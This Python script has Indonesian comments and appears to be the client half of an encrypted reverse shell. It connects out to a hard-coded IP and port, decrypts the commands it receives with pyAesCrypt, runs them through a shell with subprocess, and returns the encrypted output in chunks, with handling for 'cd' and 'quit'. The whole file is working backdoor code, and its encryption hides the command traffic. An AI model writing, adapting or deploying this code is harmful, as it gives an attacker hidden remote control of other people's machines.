#!/usr/bin/python
import subprocess,socket,os
import sys
import io
import pyAesCrypt

#Masukan IP dan Port
HOST = '192.168.1.5' #Ini adalah Ip pribadi pemilik server
PORT = 4420

#Konfigurasi socket connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

#Set buffer size dan password
bufferSize = 1024
password = 'test'

# Encrypt data
def encryptData(msg):
	pbdata = str.encode(msg)
	fIn = io.BytesIO(pbdata)
	fCiph = io.BytesIO()
	pyAesCrypt.encryptStream(fIn, fCiph, password, bufferSize)
	#Mengirim data
	dataSend = fCiph.getvalue()
	return dataSend

# Decrypt data
def decryptData(msg):
	#Inisialisasi Ciphertext
	fullData = b''
	fCiph = io.BytesIO()
	fDec = io.BytesIO()
	fCiph = io.BytesIO(msg) #Mengubah ke byte
	ctlen = len(fCiph.getvalue())
	fCiph.seek(0)
	pyAesCrypt.decryptStream(fCiph, fDec, password, bufferSize, ctlen) #Decrypt stream
	decrypted = str(fDec.getvalue().decode())
	return decrypted

s.sendall(encryptData('Halo\n'))
s.sendall(encryptData('EOFX'))

while 1:
	data = s.recv(1024)
	decrypted = decryptData(data)
	print(decrypted)
	#Apabila command "quit" maka program akan berhenti
	if decrypted == "quit":
		print('\nQuitting...')
		break
	#Apabila command "cd" maka akan diganti direktori selama valid
	elif decrypted[:2] == "cd":
		try: os.chdir(decrypted[3:])
		except:	pass
		s.sendall(encryptData('EOFX'))
	#Selain dari itu akan dijalankan proses normal
	else:
		proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		stdoutput = proc.stdout.read() + proc.stderr.read()
		sendmsg = str(stdoutput.decode())
		#Mengcek apakah output harus dibagi-bagi atau tidak
		limitBytes = 675
		if sys.getsizeof(sendmsg) >= limitBytes:
			#Menentukan berapa banyak yang harus dikirim
			calcmsg = int(round(sys.getsizeof(sendmsg) / limitBytes))
			#Get panjang dari pesan yang akan dikirim
			sendlen = int(round(len(sendmsg) / calcmsg))
			#Selama sendlen lebih besar dari limit maka akan dilakukan rounding
			while sendlen > limitBytes:
				calcmsg += 1
				sendlen = int(round(len(sendmsg) / calcmsg))
			# Mengkonversi ke int apabila berasal dari float
			if isinstance(sendlen, float):
				sendlen = int(sendlen)
			fixdlen = sendlen
			charpos = 0
			x = 1
			while x <= calcmsg:
				tosendmsg = sendmsg[charpos:sendlen]
				if x == calcmsg: 
					sendlen = len(sendmsg)
					tosendmsg = sendmsg[charpos:sendlen]
				else:
					sendlen += fixdlen
					charpos += fixdlen
				print(tosendmsg)
				s.sendall(encryptData(tosendmsg))
				x += 1
			s.sendall(encryptData('EOFX'))
		else:
			s.sendall(encryptData(sendmsg))
			s.sendall(encryptData('EOFX'))
#End Loop
s.close()